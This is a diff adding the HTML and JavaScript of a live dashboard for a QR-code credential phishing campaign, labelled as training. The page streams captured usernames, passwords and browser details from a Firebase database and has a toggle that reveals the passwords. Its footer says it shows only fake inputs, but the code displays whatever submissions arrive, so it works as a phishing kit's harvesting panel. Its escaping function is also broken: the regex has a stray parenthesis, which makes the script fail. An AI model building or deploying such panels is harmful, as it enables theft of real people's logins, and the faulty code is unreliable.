@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Live Panel — QR Credential Capture (Training)</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root { --bg:#0b1220; --card:#0e1524; --accent:#59d185; --text:#e7eef8; --muted:#9ab0cf; }
+    *{box-sizing:border-box}
+    body{margin:0; font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; background:#020817; color:var(--text);}
+    header{display:flex; align-items:center; justify-content:space-between; padding:16px 22px; background:#0b1220; position:sticky; top:0; z-index:2;}
+    h1{font-size:1.1rem; margin:0}
+    .pill{background:#091126; border:1px solid rgba(255,255,255,.08); padding:8px 10px; border-radius:999px; color:#c4d3f5; font-size:.9rem}
+    main{padding:20px}
+    table{width:100%; border-collapse:separate; border-spacing:0 8px}
+    th, td{padding:12px 14px; text-align:left}
+    th{font-weight:700; color:#cfe0ff}
+    tr{background:var(--card); border:1px solid rgba(255,255,255,.06)}
+    tr td:first-child{border-top-left-radius:12px; border-bottom-left-radius:12px}
+    tr td:last-child{border-top-right-radius:12px; border-bottom-right-radius:12px}
+    .muted{color:var(--muted)}
+    .mask{filter: blur(4px)}
+    .controls{display:flex; gap:10px; align-items:center}
+    button{background:#192338; border:1px solid rgba(255,255,255,.12); color:#dbe6ff; padding:8px 12px; border-radius:8px; cursor:pointer}
+    .foot{color:#8aa2c1; font-size:.9rem; margin-top:10px}
+    .flash{animation: flash 700ms ease}
+    @keyframes flash { from{box-shadow:0 0 0px #59d185} 50%{box-shadow:0 0 30px #59d185} to{box-shadow:0 0 0px #59d185} }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Live Panel — QR Capture (Training)</h1>
+    <div class="controls">
+      <span class="pill">Session: <strong id="sessionLabel"></strong></span>
+      <span class="pill">Submissions: <strong id="count">0</strong></span>
+      <button id="toggleMask">Show Passwords</button>
+      <button id="clear">Clear (local view only)</button>
+    </div>
+  </header>
+  <main>
+    <table>
+      <thead>
+        <tr>
+          <th>When</th>
+          <th>Username</th>
+          <th>Password</th>
+          <th class="muted">Device / Browser</th>
+        </tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="foot">Ethics: This is a training simulation displaying <em>fake</em> inputs only.</div>
+  </main>
+
+  <!-- Firebase (compat builds) -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+  <script src="firebase-config.js"></script>
+  <script>
+    const app = firebase.initializeApp(window.FIREBASE_CONFIG);
+    const db = firebase.database();
+    const sessionId = window.SESSION_ID || 'demo-session-1';
+    document.getElementById('sessionLabel').textContent = sessionId;
+
+    const rows = document.getElementById('rows');
+    const countEl = document.getElementById('count');
+    let masked = true;
+
+    document.getElementById('toggleMask').addEventListener('click', () => {
+      masked = !masked;
+      document.querySelectorAll('.pw').forEach(el => el.classList.toggle('mask', masked));
+      document.getElementById('toggleMask').textContent = masked ? 'Show Passwords' : 'Hide Passwords';
+    });
+
+    document.getElementById('clear').addEventListener('click', () => {
+      rows.innerHTML = '';
+      countEl.textContent = '0';
+    });
+
+    const ref = db.ref(`sessions/${sessionId}/entries`).limitToLast(200);
+    let count = 0;
+    ref.on('child_added', (snap) => {
+      const v = snap.val() || {};
+      const tr = document.createElement('tr');
+      tr.classList.add('flash');
+      const when = new Date(v.ts || Date.now()).toLocaleTimeString();
+      const un = (v.username || '').toString();
+      const pw = (v.password || '').toString();
+      const ua = (v.ua || '').toString();
+      tr.innerHTML = `
+        <td>${when}</td>
+        <td>${escapeHtml(un)}</td>
+        <td class="pw ${masked? 'mask':''}">${escapeHtml(pw)}</td>
+        <td class="muted">${escapeHtml(ua)}</td>
+      `;
+      rows.prepend(tr);
+      count += 1; countEl.textContent = count.toString();
+    });
+
+    function escapeHtml(str){
+      return str.replace(/[&<>"])/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[c]||c));
+    }
+  </script>
+</body>
+</html>
